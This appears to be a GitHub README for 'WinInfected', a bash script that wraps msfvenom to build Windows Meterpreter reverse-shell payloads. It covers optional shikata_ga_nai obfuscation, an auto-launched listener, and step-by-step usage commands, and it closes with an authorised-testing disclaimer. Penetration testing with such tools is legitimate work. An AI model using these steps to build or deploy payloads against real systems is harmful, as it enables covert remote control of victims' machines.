# WinInfected v1.2

WinInfected is a bash script that automates the generation of a Windows Meterpreter payload using `msfvenom` from the Metasploit Framework. The script supports payload obfuscation via the `x86/shikata_ga_nai` encoder (with 5 iterations) when the `--obfuscate` option is specified. It also offers convenient options for checking and installing dependencies, updating the required packages, and launching `msfconsole` with a pre-configured multi/handler.

## Features

- **Payload Generation:** Create a Windows Meterpreter payload using `msfvenom`.
- **Optional Obfuscation:** Use the `x86/shikata_ga_nai` encoder with 5 iterations for payload obfuscation.
- **Dependency Management:** Check for and install missing dependencies (Metasploit Framework).
- **Script Update:** Update dependencies with a single command.
- **Automated Listener:** Optionally launch `msfconsole` with a configured multi/handler to listen for incoming connections.
- **Current Directory Output:** The generated payload is saved in the current working directory with a timestamped filename.

## Usage

## Script Options

```bash
WinInfected v1.2
Usage: ./wininfected [LHOST] [LPORT] [--obfuscate]
Options:
  --dependencies   Check and install missing dependencies.
  --update         Update script and dependencies.
  --obfuscate      Enable payload obfuscation using x86/shikata_ga_nai encoder.
  -h, --help       Display this help message.
  More information: https://github.com/byfranke/wininfected
```

## Steps to Run:

```bash
git clone https://github.com/byfranke/wininfected.git
```

```bash
cd WinInfected
```
```bash
chmod +x installer.sh
```

```bash
bash installer.sh
```

Install Dependencies (if needed):
```bash
./wininfected --dependencies
```

Generate a Payload:

Without Obfuscation:
```bash
./wininfected <LHOST> <LPORT>
```

With Obfuscation:
```bash
./wininfected <LHOST> <LPORT> --obfuscate
```

Replace `<LHOST>` with your local host IP and `<LPORT>` with your desired port number.

Launch Listener (Optional): After the payload is generated, the script will prompt:

Do you want to start msfconsole to listen for connections? (y/n):
Enter `y` to launch `msfconsole` with a pre-configured multi/handler, or `n` to exit.

## Dependencies
- Metasploit Framework: Provides both `msfvenom` and `msfconsole`.
Installation (on Debian-based systems):

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

**Notes**
- The generated payload is stored in the current working directory with a filename based on the current timestamp.
- Ensure you run the script with the appropriate permissions to install packages and execute commands.
- This tool is designed for educational purposes and authorized penetration testing only.

## Disclaimer
- **WARNING:** This script is intended for legal, ethical, and authorized penetration testing only. The author is not responsible for any misuse or damage caused by this tool.
